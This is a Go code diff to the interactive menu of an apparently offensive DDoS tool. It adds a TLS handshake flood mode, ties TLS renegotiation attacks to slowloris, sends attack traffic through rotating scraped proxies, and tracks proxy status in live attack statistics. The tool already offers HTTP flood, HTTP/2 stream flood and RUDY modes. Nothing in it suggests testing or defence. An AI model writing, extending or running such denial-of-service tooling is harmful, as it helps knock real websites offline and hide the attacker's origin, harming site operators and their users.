@@ -708,6 +708,28 @@ func (m *Menu) ddosAttack() {
 	// If template mode, apply template to selected configs
 	if configChoice == "1" && templateConfig != nil {
 		fmt.Println("\n✓ Applying template configuration to selected targets...")
+
+		// Load validated proxies once for this run if the template enables proxy usage.
+		var validatedProxies []string
+		if templateConfig.UseProxy {
+			proxies, err := m.loadValidProxies()
+			if err != nil || len(proxies) == 0 {
+				proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
+				fmt.Printf("Warning: Template has UseProxy=true but no valid proxies found in %s (%v)\n", proxyPath, err)
+				fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
+				fmt.Print("Continue without proxy? (y/n): ")
+				continueStr, _ := reader.ReadString('\n')
+				if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
+					return
+				}
+				// If user chooses to continue, disable proxy usage for this run.
+				templateConfig.UseProxy = false
+			} else {
+				validatedProxies = proxies
+				fmt.Printf("✓ Loaded %d validated proxy/proxies from proxy.txt\n", len(validatedProxies))
+			}
+		}
+
 		for _, config := range selectedConfigs {
 			// Apply template settings, preserving cURL-derived fields
 			config.AttackMode = templateConfig.AttackMode
@@ -717,33 +739,29 @@ func (m *Menu) ddosAttack() {
 			config.RateLimit = templateConfig.RateLimit
 			config.FollowRedirects = templateConfig.FollowRedirects
 			config.ReuseConnections = templateConfig.ReuseConnections
-			config.UseProxy = templateConfig.UseProxy
-			config.ProxyList = templateConfig.ProxyList
-			config.RotateProxy = templateConfig.RotateProxy
 
-			// If proxy is enabled but proxy list is empty, load from default file
-			if config.UseProxy && len(config.ProxyList) == 0 {
-				proxies, err := m.loadValidProxies()
-				if err != nil || len(proxies) == 0 {
-					proxyPath := filepath.Join(dataDir, "proxy", "proxy.txt")
-					fmt.Printf("Warning: Template has UseProxy=true but no proxies found in %s (%v)\n", proxyPath, err)
-					fmt.Println("Please run 'Scrape Proxies' and 'Validate Proxies' first.")
-					fmt.Print("Continue without proxy? (y/n): ")
-					continueStr, _ := reader.ReadString('\n')
-					if strings.TrimSpace(strings.ToLower(continueStr)) != "y" {
-						return
-					}
-					config.UseProxy = false
-				} else {
-					config.ProxyList = proxies
-					fmt.Printf("✓ Loaded %d valid proxies from default location\n", len(proxies))
-				}
+			// Proxy configuration: always source from validated proxy list when enabled.
+			if templateConfig.UseProxy && len(validatedProxies) > 0 {
+				config.UseProxy = true
+				config.ProxyList = validatedProxies
+				config.RotateProxy = templateConfig.RotateProxy
+			} else {
+				config.UseProxy = false
+				config.ProxyList = nil
+				config.RotateProxy = false
 			}
+
 			config.UseCustomUserAgents = templateConfig.UseCustomUserAgents
 			config.UserAgentFilePath = templateConfig.UserAgentFilePath
-			config.UseTLSAttack = templateConfig.UseTLSAttack
+			// TLS settings: deprecated flags are ignored when using ModeTLSHandshakeFlood
+			if config.AttackMode == ddos.ModeTLSHandshakeFlood {
+				config.UseTLSAttack = false
+				config.TLSHandshakeFlood = false
+			} else {
+				config.UseTLSAttack = templateConfig.UseTLSAttack
+				config.TLSHandshakeFlood = templateConfig.TLSHandshakeFlood
+			}
 			config.ForceTLS = templateConfig.ForceTLS
-			config.TLSHandshakeFlood = templateConfig.TLSHandshakeFlood
 			config.TLSRenegotiation = templateConfig.TLSRenegotiation
 			config.TLSMinVersion = templateConfig.TLSMinVersion
 			config.TLSMaxVersion = templateConfig.TLSMaxVersion
@@ -807,7 +825,8 @@ func (m *Menu) ddosAttack() {
 		fmt.Println("  [3] Mixed               - Combination of flood (70%) and slowloris (30%)")
 		fmt.Println("  [4] HTTP/2 Stream Flood - Flood with HTTP/2 streams (HTTPS only)")
 		fmt.Println("  [5] RUDY                - Slow HTTP POST attack (R-U-Dead-Yet)")
-		fmt.Print("Enter choice (1-5, default: 1): ")
+		fmt.Println("  [6] TLS Handshake Flood - Initiate many TLS handshakes without HTTP requests")
+		fmt.Print("Enter choice (1-6, default: 1): ")
 		modeChoice, _ := reader.ReadString('\n')
 		modeChoice = strings.TrimSpace(modeChoice)
 
@@ -825,51 +844,28 @@ func (m *Menu) ddosAttack() {
 		case "5":
 			attackMode = ddos.ModeRUDY
 			fmt.Println("✓ RUDY (Slow HTTP POST) mode selected")
+		case "6":
+			attackMode = ddos.ModeTLSHandshakeFlood
+			fmt.Println("✓ TLS Handshake Flood mode selected")
 		default:
 			attackMode = ddos.ModeFlood
 			fmt.Println("✓ HTTP Flood mode selected")
 		}
 
-		// TLS Attack Configuration
-		fmt.Println("\n===== TLS Attack Configuration =====")
-		fmt.Print("Enable TLS attack combinations? (y/n, default: n): ")
-		useTLSAttackStr, _ := reader.ReadString('\n')
-		useTLSAttackStr = strings.TrimSpace(strings.ToLower(useTLSAttackStr))
-		useTLSAttack := useTLSAttackStr == "y" || useTLSAttackStr == "yes"
-
-		var forceTLS, tlsHandshakeFlood, tlsRenegotiation bool
+		// TLS Configuration
+		var forceTLS, tlsRenegotiation bool
 		var tlsMinVersion, tlsMaxVersion uint16
 		var tlsCipherSuites []uint16
 
-		if useTLSAttack {
-			fmt.Println("✓ TLS attack combinations enabled")
-			fmt.Println("\nTLS Attack Options:")
-
-			// Force TLS on HTTP URLs
+		if attackMode == ddos.ModeTLSHandshakeFlood {
+			// TLS Handshake Flood mode specific configuration
+			fmt.Println("\n===== TLS Handshake Flood Configuration =====")
 			fmt.Print("Force TLS on HTTP URLs? (y/n, default: n): ")
 			forceTLSStr, _ := reader.ReadString('\n')
 			forceTLSStr = strings.TrimSpace(strings.ToLower(forceTLSStr))
 			forceTLS = forceTLSStr == "y" || forceTLSStr == "yes"
 			if forceTLS {
 				fmt.Println("✓ Force TLS enabled - HTTP URLs will use TLS")
-			}
-
-			// TLS Handshake Flood
-			fmt.Print("Enable TLS Handshake Flood? (y/n, default: n): ")
-			handshakeFloodStr, _ := reader.ReadString('\n')
-			handshakeFloodStr = strings.TrimSpace(strings.ToLower(handshakeFloodStr))
-			tlsHandshakeFlood = handshakeFloodStr == "y" || handshakeFloodStr == "yes"
-			if tlsHandshakeFlood {
-				fmt.Println("✓ TLS Handshake Flood enabled - Will initiate many TLS handshakes")
-			}
-
-			// TLS Renegotiation
-			fmt.Print("Enable TLS Renegotiation attacks? (y/n, default: n): ")
-			renegotiationStr, _ := reader.ReadString('\n')
-			renegotiationStr = strings.TrimSpace(strings.ToLower(renegotiationStr))
-			tlsRenegotiation = renegotiationStr == "y" || renegotiationStr == "yes"
-			if tlsRenegotiation {
-				fmt.Println("✓ TLS Renegotiation enabled - Will force renegotiation on connections")
 			}
 
 			// TLS Version configuration (optional)
@@ -918,8 +914,16 @@ func (m *Menu) ddosAttack() {
 					}
 				}
 			}
-		} else {
-			fmt.Println("✓ TLS attack combinations disabled")
+		} else if attackMode == ddos.ModeSlowloris {
+			// Slowloris mode can use TLS renegotiation
+			fmt.Println("\n===== TLS Configuration (for Slowloris) =====")
+			fmt.Print("Enable TLS Renegotiation attacks? (y/n, default: n): ")
+			renegotiationStr, _ := reader.ReadString('\n')
+			renegotiationStr = strings.TrimSpace(strings.ToLower(renegotiationStr))
+			tlsRenegotiation = renegotiationStr == "y" || renegotiationStr == "yes"
+			if tlsRenegotiation {
+				fmt.Println("✓ TLS Renegotiation enabled - Will force renegotiation on connections")
+			}
 		}
 
 		// Number of threads
@@ -1067,10 +1071,13 @@ func (m *Menu) ddosAttack() {
 			if useCustomUserAgents {
 				config.UserAgentFilePath = filepath.Join(dataDir, "user-agent.txt")
 			}
-			// Apply TLS attack settings
-			config.UseTLSAttack = useTLSAttack
+			// Apply TLS settings
+			// Note: UseTLSAttack and TLSHandshakeFlood are deprecated when using ModeTLSHandshakeFlood
+			if attackMode != ddos.ModeTLSHandshakeFlood {
+				config.UseTLSAttack = false
+				config.TLSHandshakeFlood = false
+			}
 			config.ForceTLS = forceTLS
-			config.TLSHandshakeFlood = tlsHandshakeFlood
 			config.TLSRenegotiation = tlsRenegotiation
 			config.TLSMinVersion = tlsMinVersion
 			config.TLSMaxVersion = tlsMaxVersion
@@ -1106,26 +1113,20 @@ func (m *Menu) ddosAttack() {
 		fmt.Printf("User Agents:       Built-in\n")
 	}
 	if firstConfig.UseProxy {
-		fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
+		fmt.Printf("Proxy:             Enabled (%d proxies, rotation: %v, source: proxy.txt)\n", len(firstConfig.ProxyList), firstConfig.RotateProxy)
 	} else {
 		fmt.Printf("Proxy:             Disabled\n")
 	}
-	if firstConfig.UseTLSAttack {
-		fmt.Printf("TLS Attacks:       Enabled\n")
+	if firstConfig.AttackMode == ddos.ModeTLSHandshakeFlood {
+		fmt.Printf("TLS Handshake Flood: Enabled\n")
 		if firstConfig.ForceTLS {
 			fmt.Printf("  - Force TLS:     Enabled\n")
 		}
-		if firstConfig.TLSHandshakeFlood {
-			fmt.Printf("  - Handshake Flood: Enabled\n")
-		}
-		if firstConfig.TLSRenegotiation {
-			fmt.Printf("  - Renegotiation:  Enabled\n")
-		}
 		if firstConfig.TLSMinVersion > 0 || firstConfig.TLSMaxVersion > 0 {
-			fmt.Printf("  - TLS Versions:   Min=%d, Max=%d\n", firstConfig.TLSMinVersion, firstConfig.TLSMaxVersion)
+			fmt.Printf("  - TLS Versions:   Min=0x%04x, Max=0x%04x\n", firstConfig.TLSMinVersion, firstConfig.TLSMaxVersion)
 		}
-	} else {
-		fmt.Printf("TLS Attacks:       Disabled\n")
+	} else if firstConfig.TLSRenegotiation {
+		fmt.Printf("TLS Renegotiation:  Enabled (for Slowloris)\n")
 	}
 	if firstConfig.UseHTTP2 {
 		fmt.Printf("HTTP/2 Support:    Enabled\n")
@@ -1231,12 +1232,15 @@ func (m *Menu) ddosAttack() {
 
 				var totalSent, totalSuccess, totalFailed int64
 				var totalRPS float64
+				var totalActiveProxies, totalDisabledProxies int
 
 				for _, stats := range lastStats {
 					totalSent += stats.RequestsSent
 					totalSuccess += stats.RequestsSuccess
 					totalFailed += stats.RequestsFailed
 					totalRPS += stats.RequestsPerSec
+					totalActiveProxies += stats.ActiveProxies
+					totalDisabledProxies += stats.DisabledProxies
 				}
 
 				if len(lastStats) > 0 {
@@ -1251,13 +1255,19 @@ func (m *Menu) ddosAttack() {
 						remaining = 0
 					}
 
-					fmt.Printf("⏱  Elapsed: %s | Remaining: %s | Sent: %d | Success: %d | Failed: %d | RPS: %.0f",
+					proxyInfo := ""
+					if firstConfig.UseProxy {
+						proxyInfo = fmt.Sprintf(" | Proxies (active/disabled): %d/%d", totalActiveProxies, totalDisabledProxies)
+					}
+
+					fmt.Printf("⏱  Elapsed: %s | Remaining: %s | Sent: %d | Success: %d | Failed: %d | RPS: %.0f%s",
 						ddos.FormatDuration(elapsed),
 						ddos.FormatDuration(remaining),
 						totalSent,
 						totalSuccess,
 						totalFailed,
-						totalRPS)
+						totalRPS,
+						proxyInfo)
 				}
 				progressMutex.Unlock()
 			}
@@ -1289,6 +1299,10 @@ func (m *Menu) ddosAttack() {
 		fmt.Printf("  Data Received:     %s\n", ddos.FormatBytes(stats.BytesReceived))
 		fmt.Printf("  Avg Response Time: %s\n", stats.AvgResponseTime)
 		fmt.Printf("  Requests/sec:      %.2f\n", stats.RequestsPerSec)
+		if selectedConfigs[i].UseProxy {
+			fmt.Printf("  Proxies Active:    %d\n", stats.ActiveProxies)
+			fmt.Printf("  Proxies Disabled:  %d\n", stats.DisabledProxies)
+		}
 	}
 
 	if len(attacks) > 1 {
